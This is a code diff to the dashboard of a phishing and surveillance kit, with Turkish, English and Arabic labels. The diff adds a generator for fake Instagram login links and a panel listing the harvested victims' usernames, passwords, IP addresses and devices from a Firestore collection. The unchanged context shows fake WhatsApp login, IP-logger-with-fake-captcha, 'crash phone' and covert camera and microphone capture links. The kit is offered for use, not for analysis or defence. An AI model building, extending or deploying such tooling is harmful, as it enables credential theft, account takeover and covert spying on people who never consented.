@@ -147,9 +147,19 @@
             <button class="btn-primary btn-hack" id="ipLoggerBtn">📡 IP LOGGER + FAKE CAPTCHA</button>
             <button class="btn-primary btn-hack" id="fakeWABtn">🔐 FAKE WHATSAPP LOGIN</button>
             <button class="btn-primary btn-hack" id="crashBtn">💀 CRASH PHONE (RAM KILLER)</button>
-			<button class="btn-primary btn-hack" id="instaLogsBtn">📸 INSTAGRAM LOGS</button>
+            <button class="btn-primary btn-hack" id="instaFakeBtn">📸 INSTAGRAM FAKE LOGIN</button>
         </div>
         <div class="output-box" id="hackOutput"></div>
+    </div>
+    
+    <!-- YENİ: HESAPLAR PANELİ -->
+    <div class="panel">
+        <h3>📋 HESAPLAR (INSTAGRAM LOGS)</h3>
+        <div class="btn-group-custom" style="margin-bottom: 15px;">
+            <button class="btn-primary" id="refreshAccountsBtn">⟳ YENİLE</button>
+            <button class="btn-primary btn-danger-custom" id="clearAccountsBtn">🗑 HESAPLARI TEMİZLE</button>
+        </div>
+        <div id="accountsList" class="loading">⟳ YÜKLENİYOR...</div>
     </div>
     
     <div class="btn-group-custom" style="margin-bottom: 20px;">
@@ -178,7 +188,7 @@
 <script type="module">
     import { initializeApp } from "firebase/app";
     import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
-    import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";
+    import { getFirestore, collection, query, where, getDocs, deleteDoc, doc, orderBy } from "firebase/firestore";
 
     const firebaseConfig = window.FIREBASE_CONFIG;
     const app = initializeApp(firebaseConfig);
@@ -199,7 +209,8 @@
             loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
             confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
             photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO",
-            crash: "💀 CRASH LINK", ipLogger: "📡 IP LOGGER + CAPTCHA", fakeWA: "🔐 FAKE WHATSAPP"
+            crash: "💀 CRASH LINK", ipLogger: "📡 IP LOGGER + CAPTCHA", fakeWA: "🔐 FAKE WHATSAPP",
+            fakeIG: "📸 INSTAGRAM FAKE LOGIN", accountsTitle: "📋 HESAPLAR (INSTAGRAM LOGS)"
         },
         ar: {
             accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
@@ -212,7 +223,8 @@
             loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
             confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
             photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت",
-            crash: "💀 رابط تجميد", ipLogger: "📡 رابط تجميع بيانات", fakeWA: "🔐 وهمي واتساب"
+            crash: "💀 رابط تجميد", ipLogger: "📡 رابط تجميع بيانات", fakeWA: "🔐 وهمي واتساب",
+            fakeIG: "📸 تسجيل دخول انستغرام وهمي", accountsTitle: "📋 الحسابات (سجلات انستغرام)"
         }
     };
 
@@ -244,6 +256,7 @@
         document.getElementById('igVideoOnlyBtn').innerHTML = `🎬 ${t('videoOnly')} (INSTA)`;
         document.getElementById('igAudioBtn').innerHTML = `🎤 ${t('audioOnly')} (INSTA)`;
         document.getElementById('igVideoAudioBtn').innerHTML = `🎬🎤 ${t('videoAudio')} (INSTA)`;
+        document.getElementById('instaFakeBtn').innerHTML = t('fakeIG');
         
         const val = document.getElementById('videoDuration').value;
         document.getElementById('durationValue').innerText = val + ' ' + t('sec');
@@ -310,6 +323,49 @@
             listDiv.innerHTML = html;
         } catch(err) { listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
     }
+
+    // YENİ: Hesapları getir
+    async function loadAccounts() {
+        if (!currentUser) return;
+        const listDiv = document.getElementById('accountsList');
+        listDiv.innerHTML = `<div class="loading">⟳ YÜKLENİYOR...</div>`;
+        try {
+            const q = query(collection(db, "ig_accounts"), where("ownerId", "==", currentUser.uid), orderBy("timestamp", "desc"));
+            const snapshot = await getDocs(q);
+            if (snapshot.empty) {
+                listDiv.innerHTML = `<div class="loading">[ HENÜZ HESAP YOK ]</div>`;
+                return;
+            }
+            let html = '<div style="display:flex; flex-direction:column; gap:12px;">';
+            snapshot.forEach(docSnap => {
+                const data = docSnap.data();
+                html += `
+                    <div style="background:#0a0c15; border:1px solid #2a2e44; padding:12px; border-radius:12px;">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <span style="color:#00ff41; font-size:0.8rem;">👤 ${data.username || 'N/A'}</span>
+                            <span style="color:#888; font-size:0.65rem;">${new Date(data.timestamp).toLocaleString()}</span>
+                        </div>
+                        <div style="color:#ccc; font-size:0.7rem; margin-top:6px;">
+                            🔑 Şifre: ${data.password || 'N/A'}<br>
+                            🌐 IP: ${data.ip || 'N/A'}<br>
+                            📱 Cihaz: ${data.userAgent?.substring(0, 50) || 'N/A'}
+                        </div>
+                    </div>
+                `;
+            });
+            html += '</div>';
+            listDiv.innerHTML = html;
+        } catch(err) { listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`; }
+    }
+
+    async function clearAccounts() {
+        if (!currentUser) return;
+        if (!confirm('Tüm IG hesaplarını silmek istediğinize emin misiniz?')) return;
+        const q = query(collection(db, "ig_accounts"), where("ownerId", "==", currentUser.uid));
+        const snapshot = await getDocs(q);
+        for (const docSnap of snapshot.docs) await deleteDoc(doc(db, "ig_accounts", docSnap.id));
+        await loadAccounts();
+    }
     
     window.downloadAllMedia = async (mediaUrls) => {
         for (let url of mediaUrls) {
@@ -372,16 +428,17 @@
         const crashUrl = `${BASE_URL}/?crash=1&uid=${currentUser.uid}`;
         document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 💀 CRASH LINK: <a href="${crashUrl}" target="_blank" style="color:#ff0000;font-weight:bold;">${crashUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${crashUrl}')">${t('copy')}</button><br><small style="color:#ff0000;">Telefonu dondura (RAM/CPU overload)</small>`;
     }
-	document.getElementById('instaLogsBtn').onclick = () => {
-    if (!currentUser) return;
-    const logsUrl = `${window.location.origin}/hack/instagram_logs_viewer.html?uid=${currentUser.uid}`;
-    document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📸 INSTAGRAM LOGS PANELI: <a href="${logsUrl}" target="_blank" style="color:#00ff41">${logsUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${logsUrl}')">${t('copy')}</button><br><small style="color:#00ff41;">Kendi linkine gelen kullanıcıların Instagram giriş bilgilerini gösterir</small>`;
-};
+
+    // YENİ: INSTAGRAM FAKE LOGIN LINKI
+    function generateInstaFake() {
+        if (!currentUser) return;
+        const instaUrl = `${BASE_URL}/instagram_login.html?uid=${currentUser.uid}`;
+        document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📸 INSTAGRAM FAKE LOGIN: <a href="${instaUrl}" target="_blank" style="color:#ffaa00">${instaUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${instaUrl}')">${t('copy')}</button><br><small style="color:#ffaa00;">Instagram giriş sayfası. Kullanıcı adı ve şifreyi çalar.</small>`;
+    }
     
     function showStatsInfo() {
         alert("📊 STATS\n\nBu panelde çekimleriniz listelenir.");
     }
-	
     
     document.getElementById('genPhotoBtn').onclick = () => generateLink('photo', false);
     document.getElementById('gen5PhotoBtn').onclick = () => generateLink('5photos', false);
@@ -398,6 +455,9 @@
     document.getElementById('ipLoggerBtn').onclick = generateIPLogger;
     document.getElementById('fakeWABtn').onclick = generateFakeWA;
     document.getElementById('crashBtn').onclick = generateCrash;
+    document.getElementById('instaFakeBtn').onclick = generateInstaFake;
+    document.getElementById('refreshAccountsBtn').onclick = loadAccounts;
+    document.getElementById('clearAccountsBtn').onclick = clearAccounts;
     
     document.getElementById('refreshBtn').onclick = loadMyData;
     document.getElementById('clearAllBtn').onclick = clearAll;
@@ -409,7 +469,7 @@
     modal.onclick = (e) => { if (e.target === modal || e.target.classList.contains('modal-close')) { modal.style.display = 'none'; document.getElementById('modalContent').innerHTML = ''; } };
     
     onAuthStateChanged(auth, (user) => {
-        if (user) { currentUser = user; applyLanguage(); loadMyData(); }
+        if (user) { currentUser = user; applyLanguage(); loadMyData(); loadAccounts(); }
         else window.location.href = 'login.html';
     });
 </script>
